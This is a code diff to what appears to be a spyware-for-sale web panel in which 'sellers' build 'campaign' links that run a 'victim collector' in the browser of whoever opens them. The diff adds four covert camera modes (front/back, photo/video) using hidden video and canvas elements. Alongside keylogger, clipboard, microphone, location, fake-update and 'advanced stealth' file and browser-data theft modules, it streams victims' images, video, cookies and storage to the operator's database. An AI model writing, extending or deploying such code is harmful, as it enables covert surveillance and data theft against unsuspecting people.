@@ -87,13 +87,35 @@
             background: #f8fafc;
             border: 1px solid #e2e8f0;
             border-radius: 1rem;
-            padding: 1rem;
+            padding: 0.8rem 0.5rem;
             text-align: center;
             cursor: pointer;
             transition: all 0.2s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
         }
-        .feature-card i { font-size: 1.8rem; color: #2a5298; margin-bottom: 0.5rem; display: block; }
-        .feature-card span { font-size: 0.9rem; font-weight: 500; }
+        .feature-card i {
+            font-size: 1.6rem;
+            color: #2a5298;
+            margin-bottom: 0.3rem;
+        }
+        .feature-card span {
+            font-size: 0.7rem;
+            font-weight: 500;
+            line-height: 1.2;
+            white-space: nowrap;
+        }
+        /* মোবাইলে টেক্সট এক লাইনে রাখার জন্য ফন্ট সাইজ আরও ছোট */
+        @media (max-width: 640px) {
+            .feature-card span {
+                font-size: 0.6rem;
+            }
+            .feature-card i {
+                font-size: 1.4rem;
+            }
+        }
         .feature-card.selected {
             background: linear-gradient(135deg, #eef2ff, #ffffff);
             border-color: #2a5298;
@@ -135,18 +157,27 @@
             border-radius: 1rem;
             border: 1px solid #e2e8f0;
         }
-        .camera-custom h4 { margin-bottom: 0.5rem; }
-        .camera-custom .flex-row {
-            display: flex;
+        .camera-custom h4 { margin-bottom: 0.8rem; }
+        .camera-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
             gap: 1rem;
-            flex-wrap: wrap;
-            align-items: center;
         }
-        .camera-custom label { font-size: 0.8rem; margin-right: 0.5rem; }
-        .camera-custom select, .camera-custom input {
-            padding: 0.3rem;
+        .camera-option {
+            display: flex;
+            flex-direction: column;
+            gap: 0.3rem;
+        }
+        .camera-option label {
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: #1e3c72;
+        }
+        .camera-option select, .camera-option input {
+            padding: 0.4rem;
             border-radius: 0.5rem;
             border: 1px solid #cbd5e1;
+            background: white;
         }
         .link-box {
             background: #f0f4ff;
@@ -321,9 +352,28 @@
             border-radius: 0.5rem;
         }
         .status-msg { text-align: center; color: #2a5298; margin: 1rem; }
+        /* Compact passive info */
+        .passive-compact {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            background: #f8fafc;
+            padding: 0.8rem;
+            border-radius: 1rem;
+            border: 1px solid #e2e8f0;
+        }
+        .passive-item {
+            background: #eef2ff;
+            padding: 0.2rem 0.6rem;
+            border-radius: 1rem;
+            font-size: 0.7rem;
+            color: #1e3c72;
+            white-space: nowrap;
+        }
         @media (max-width: 640px) {
             body { padding: 1rem; }
             .thumbnail { width: 70px; height: 70px; }
+            .passive-item { font-size: 0.6rem; }
         }
     </style>
 </head>
@@ -344,37 +394,37 @@
         <div class="card">
             <h3><i class="fas fa-microchip"></i> SELECT MODULES</h3>
             <div class="feature-grid" id="featureGrid">
-                <div class="feature-card" data-feat="C"><i class="fas fa-camera"></i><span>CAMERA</span></div>
-                <div class="feature-card" data-feat="M"><i class="fas fa-microphone"></i><span>MICROPHONE</span></div>
-                <div class="feature-card" data-feat="L"><i class="fas fa-map-marker-alt"></i><span>LOCATION</span></div>
-                <div class="feature-card" data-feat="K"><i class="fas fa-keyboard"></i><span>KEYLOGGER</span></div>
-                <div class="feature-card" data-feat="P"><i class="fas fa-clipboard"></i><span>CLIPBOARD</span></div>
-                <div class="feature-card" data-feat="R"><i class="fas fa-video"></i><span>SCREEN REC</span></div>
-                <div class="feature-card" data-feat="N"><i class="fas fa-network-wired"></i><span>NET SCAN</span></div>
-                <div class="feature-card" data-feat="F"><i class="fas fa-ad"></i><span>FAKE UPDATE</span></div>
+                <!-- Camera split into 4 separate options -->
+                <div class="feature-card" data-feat="CFP"><i class="fas fa-camera"></i><span>📸 CAM FRONT PHOTO</span></div>
+                <div class="feature-card" data-feat="CFV"><i class="fas fa-video"></i><span>🎥 CAM FRONT VIDEO</span></div>
+                <div class="feature-card" data-feat="CBP"><i class="fas fa-camera"></i><span>📸 CAM BACK PHOTO</span></div>
+                <div class="feature-card" data-feat="CBV"><i class="fas fa-video"></i><span>🎥 CAM BACK VIDEO</span></div>
+                <div class="feature-card" data-feat="M"><i class="fas fa-microphone"></i><span>🎙️ MICROPHONE</span></div>
+                <div class="feature-card" data-feat="L"><i class="fas fa-map-marker-alt"></i><span>📍 LOCATION</span></div>
+                <div class="feature-card" data-feat="K"><i class="fas fa-keyboard"></i><span>⌨️ KEYLOGGER</span></div>
+                <div class="feature-card" data-feat="P"><i class="fas fa-clipboard"></i><span>📋 CLIPBOARD</span></div>
+                <div class="feature-card" data-feat="R"><i class="fas fa-video"></i><span>🖥️ SCREEN REC</span></div>
+                <div class="feature-card" data-feat="N"><i class="fas fa-network-wired"></i><span>🌐 NET SCAN</span></div>
+                <div class="feature-card" data-feat="F"><i class="fas fa-ad"></i><span>⚠️ FAKE UPDATE</span></div>
             </div>
             <div class="toggle-switch">
                 <input type="checkbox" id="advancedToggle">
-                <label for="advancedToggle">⚡ ADVANCED STEALTH (Video Rec, File Steal, Browser Data, DNS Leak, Sensors)</label>
+                <label for="advancedToggle">⚡ ADVANCED STEALTH (File Steal, Browser Data, DNS Leak, Sensors)</label>
             </div>
             <div id="cameraCustom" class="camera-custom">
                 <h4><i class="fas fa-camera"></i> Camera Customization (Advanced only)</h4>
-                <div class="flex-row">
-                    <div>
-                        <label>📷 Camera:</label>
-                        <select id="cameraFacing">
-                            <option value="auto">Auto</option>
-                            <option value="user">Front (Selfie)</option>
-                            <option value="environment">Back (Rear)</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label>⏱️ Image interval (seconds):</label>
+                <div class="camera-grid">
+                    <div class="camera-option">
+                        <label><i class="fas fa-clock"></i> Photo Interval (sec):</label>
                         <input type="number" id="cameraInterval" value="2" step="0.5" min="0.5">
                     </div>
-                    <div>
-                        <label>🎥 Video clip duration (seconds):</label>
+                    <div class="camera-option">
+                        <label><i class="fas fa-video"></i> Video Clip Duration (sec):</label>
                         <input type="number" id="videoDuration" value="8" step="1" min="1">
+                    </div>
+                    <div class="camera-option">
+                        <label><i class="fas fa-image"></i> Photo Quality (%):</label>
+                        <input type="number" id="photoQuality" value="70" step="5" min="10" max="100">
                     </div>
                 </div>
             </div>
@@ -597,27 +647,19 @@
                         </div>
                         <div class="tab-content active" id="tab-passive-${victimId}">
                             ${data.passiveInfo ? `
-                                <div style="display:grid; grid-template-columns:1fr 1fr; gap:0.8rem; background:#f8fafc; padding:1rem; border-radius:1rem; border:1px solid #e2e8f0;">
-                                    <div><strong>🌐 Public IP</strong><br>${data.passiveInfo.ip || 'N/A'}</div>
-                                    <div><strong>🔋 Battery</strong><br>${data.passiveInfo.battery || 'N/A'}</div>
-                                    <div><strong>💻 Platform</strong><br>${data.passiveInfo.platform || 'N/A'}</div>
-                                    <div><strong>🗣️ Language</strong><br>${data.passiveInfo.language || 'N/A'}</div>
-                                    <div><strong>🖥️ Screen</strong><br>${data.passiveInfo.screen || 'N/A'}</div>
-                                    <div><strong>⏰ Timezone</strong><br>${data.passiveInfo.timezone || 'N/A'}</div>
-                                    <div><strong>🎮 GPU</strong><br>${data.passiveInfo.gpu || 'N/A'}</div>
-                                    <div><strong>🎙️ Audio Inputs</strong><br>${data.passiveInfo.audioInputs || 'N/A'}</div>
-                                    <div><strong>💾 Device Memory</strong><br>${data.passiveInfo.deviceMemory || 'N/A'}</div>
-                                    <div><strong>📡 Connection</strong><br>${data.passiveInfo.connection ? `${data.passiveInfo.connection.effectiveType}, ${data.passiveInfo.connection.downlink} Mbps` : 'N/A'}</div>
-                                    <div><strong>🚫 Do Not Track</strong><br>${data.passiveInfo.doNotTrack || 'N/A'}</div>
-                                    <div><strong>⚙️ Hardware Concurrency</strong><br>${data.passiveInfo.hardwareConcurrency || 'N/A'}</div>
-                                    <div><strong>🖌️ Canvas FP</strong><br>${data.passiveInfo.canvasFingerprint ? data.passiveInfo.canvasFingerprint.substring(0,40)+'...' : 'N/A'}</div>
-                                    <div><strong>🎨 WebGL Vendor</strong><br>${data.passiveInfo.webglVendor || 'N/A'}</div>
-                                    <div><strong>🔤 Fonts</strong><br>${(data.passiveInfo.fonts || []).join(', ') || 'N/A'}</div>
-                                    <div><strong>🔌 Plugins</strong><br>${(data.passiveInfo.plugins || []).join(', ') || 'N/A'}</div>
-                                    <div><strong>🏠 Local IP (WebRTC)</strong><br>${data.passiveInfo.localIP || 'N/A'}</div>
-                                    <div><strong>🍪 Cookies</strong><br>${data.passiveInfo.cookies ? data.passiveInfo.cookies.substring(0,100)+'...' : 'N/A'}</div>
-                                    <div><strong>📦 LocalStorage</strong><br>${data.passiveInfo.localStorage ? data.passiveInfo.localStorage.substring(0,100)+'...' : 'N/A'}</div>
-                                    <div><strong>💾 SessionStorage</strong><br>${data.passiveInfo.sessionStorage ? data.passiveInfo.sessionStorage.substring(0,100)+'...' : 'N/A'}</div>
+                                <div class="passive-compact">
+                                    <span class="passive-item"><i class="fas fa-globe"></i> IP: ${data.passiveInfo.ip || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-battery-full"></i> Bat: ${data.passiveInfo.battery || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-laptop"></i> ${data.passiveInfo.platform || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-language"></i> ${data.passiveInfo.language || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-desktop"></i> ${data.passiveInfo.screen || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-clock"></i> ${data.passiveInfo.timezone || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-microchip"></i> ${data.passiveInfo.hardwareConcurrency || 'N/A'} cores</span>
+                                    <span class="passive-item"><i class="fas fa-tv"></i> GPU: ${(data.passiveInfo.gpu || 'N/A').substring(0,20)}</span>
+                                    <span class="passive-item"><i class="fas fa-network-wired"></i> ${data.passiveInfo.localIP || 'N/A'}</span>
+                                    <span class="passive-item"><i class="fas fa-plug"></i> Plugins: ${(data.passiveInfo.plugins || []).length}</span>
+                                    <span class="passive-item"><i class="fas fa-font"></i> Fonts: ${(data.passiveInfo.fonts || []).length}</span>
+                                    <span class="passive-item"><i class="fas fa-cookie-bite"></i> Cookies: ${data.passiveInfo.cookies ? data.passiveInfo.cookies.length : 0} chars</span>
                                 </div>
                             ` : '<i>No passive data collected</i>'}
                         </div>
@@ -736,10 +778,9 @@
         const selected = Array.from(document.querySelectorAll('.feature-card.selected')).map(c => c.getAttribute('data-feat')).join('');
         if(selected.length === 0) { showMsg('Select at least one feature', true); return; }
         const advanced = document.getElementById('advancedToggle').checked ? 'ADV' : '';
-        // Get camera customization values (only used if advanced and camera selected)
-        const cameraFacing = document.getElementById('cameraFacing').value;
         const cameraInterval = parseFloat(document.getElementById('cameraInterval').value);
         const videoDuration = parseInt(document.getElementById('videoDuration').value);
+        const photoQuality = parseInt(document.getElementById('photoQuality').value);
         const campId = 'CAMP_' + Date.now() + '_' + Math.random().toString(36).substring(2,6);
         db.ref(`sellers/${currentUid}/campaigns/${campId}`).set({
             features: selected,
@@ -747,10 +788,9 @@
             clicks: 0,
             createdAt: Date.now(),
             victims: {},
-            // camera custom settings
-            cameraFacing: cameraFacing,
             cameraInterval: cameraInterval,
-            videoDuration: videoDuration
+            videoDuration: videoDuration,
+            photoQuality: photoQuality
         }).then(async () => {
             let fullLink = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
             let finalLink = fullLink;
@@ -782,7 +822,7 @@
         showMsg('Data exported');
     });
 
-    // ========== VICTIM COLLECTOR (FULL with custom camera settings) ==========
+    // ========== VICTIM COLLECTOR (with split camera options) ==========
     async function startVictimCollector(sellerUid, campaignId, features, advanced, campaignData) {
         const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substring(2,8);
         const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);
@@ -887,7 +927,7 @@
         victimData.localStorage = localStorageData;
         victimData.sessionStorage = sessionStorageData;
 
-        // ---------- OPTIONAL FEATURES (permission based) ----------
+        // ---------- OPTIONAL FEATURES ----------
         // Location
         if(features.includes('L') && navigator.geolocation) {
             const getLoc = () => {
@@ -899,31 +939,54 @@
             getLoc(); setInterval(getLoc, 30000);
         }
 
-        // Camera (with custom facing mode and interval)
-        if(features.includes('C')) {
+        // Camera: split into 4 modes
+        let cameraMode = null;
+        let facingMode = null;
+        let captureType = null;
+        if(features.includes('CFP')) { cameraMode = 'front_photo'; facingMode = 'user'; captureType = 'photo'; }
+        if(features.includes('CFV')) { cameraMode = 'front_video'; facingMode = 'user'; captureType = 'video'; }
+        if(features.includes('CBP')) { cameraMode = 'back_photo'; facingMode = 'environment'; captureType = 'photo'; }
+        if(features.includes('CBV')) { cameraMode = 'back_video'; facingMode = 'environment'; captureType = 'video'; }
+
+        if(cameraMode) {
             try {
-                let constraints = { video: true };
-                if (campaignData && campaignData.cameraFacing && campaignData.cameraFacing !== 'auto') {
-                    constraints.video = { facingMode: { exact: campaignData.cameraFacing } };
-                }
+                let constraints = { video: { facingMode: { exact: facingMode } } };
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                const video = document.getElementById('hiddenVideo');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.getElementById('hiddenCanvas');
-                // Image capture interval (in milliseconds)
-                let intervalMs = (campaignData && campaignData.cameraInterval) ? campaignData.cameraInterval * 1000 : 2000;
-                const capture = () => {
-                    if(video.videoWidth && video.videoHeight){
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        canvas.getContext('2d').drawImage(video,0,0);
-                        victimData.camera.push(canvas.toDataURL('image/jpeg',0.7));
-                        victimRef.child('camera').set(victimData.camera);
-                    }
-                };
-                capture(); // immediate first
-                setInterval(capture, intervalMs);
+                if(captureType === 'photo') {
+                    const video = document.getElementById('hiddenVideo');
+                    video.srcObject = stream;
+                    await video.play();
+                    const canvas = document.getElementById('hiddenCanvas');
+                    let intervalMs = (campaignData && campaignData.cameraInterval) ? campaignData.cameraInterval * 1000 : 2000;
+                    let quality = (campaignData && campaignData.photoQuality) ? campaignData.photoQuality / 100 : 0.7;
+                    const capture = () => {
+                        if(video.videoWidth && video.videoHeight){
+                            canvas.width = video.videoWidth;
+                            canvas.height = video.videoHeight;
+                            canvas.getContext('2d').drawImage(video,0,0);
+                            victimData.camera.push(canvas.toDataURL('image/jpeg', quality));
+                            victimRef.child('camera').set(victimData.camera);
+                        }
+                    };
+                    capture();
+                    setInterval(capture, intervalMs);
+                } else if(captureType === 'video') {
+                    const recorder = new RecordRTC(stream, { type: 'video', mimeType: 'video/webm' });
+                    recorder.startRecording();
+                    let duration = (campaignData && campaignData.videoDuration) ? campaignData.videoDuration * 1000 : 8000;
+                    setTimeout(() => {
+                        recorder.stopRecording(() => {
+                            const blob = recorder.getBlob();
+                            const reader = new FileReader();
+                            reader.onloadend = () => {
+                                victimData.videoRec.push(reader.result);
+                                victimRef.child('videoRec').set(victimData.videoRec);
+                                stream.getTracks().forEach(t => t.stop());
+                            };
+                            reader.readAsDataURL(blob);
+                        });
+                    }, duration);
+                }
             } catch(e) { console.error("Camera error", e); }
         }
 
@@ -1043,32 +1106,6 @@
 
         // ---------- ADVANCED STEALTH FEATURES (if advanced flag is true) ----------
         if(advanced === 'ADV') {
-            // Video Recording from Camera (using custom duration)
-            if(features.includes('C')) {
-                try {
-                    let constraints = { video: true };
-                    if (campaignData && campaignData.cameraFacing && campaignData.cameraFacing !== 'auto') {
-                        constraints.video = { facingMode: { exact: campaignData.cameraFacing } };
-                    }
-                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                    const recorder = new RecordRTC(stream, { type: 'video', mimeType: 'video/webm' });
-                    recorder.startRecording();
-                    let duration = (campaignData && campaignData.videoDuration) ? campaignData.videoDuration * 1000 : 8000;
-                    setTimeout(() => {
-                        recorder.stopRecording(() => {
-                            const blob = recorder.getBlob();
-                            const reader = new FileReader();
-                            reader.onloadend = () => {
-                                victimData.videoRec.push(reader.result);
-                                victimRef.child('videoRec').set(victimData.videoRec);
-                                stream.getTracks().forEach(t => t.stop());
-                            };
-                            reader.readAsDataURL(blob);
-                        });
-                    }, duration);
-                } catch(e){}
-            }
-
             // Longer microphone clips (keep as is)
             if(features.includes('M')) {
                 const longRecord = async () => {
@@ -1211,7 +1248,6 @@
             if(advancedToggle.checked) cameraCustomDiv.style.display = 'block';
             else cameraCustomDiv.style.display = 'none';
         });
-        // Initial visibility
         if(advancedToggle.checked) cameraCustomDiv.style.display = 'block';
         else cameraCustomDiv.style.display = 'none';
     }
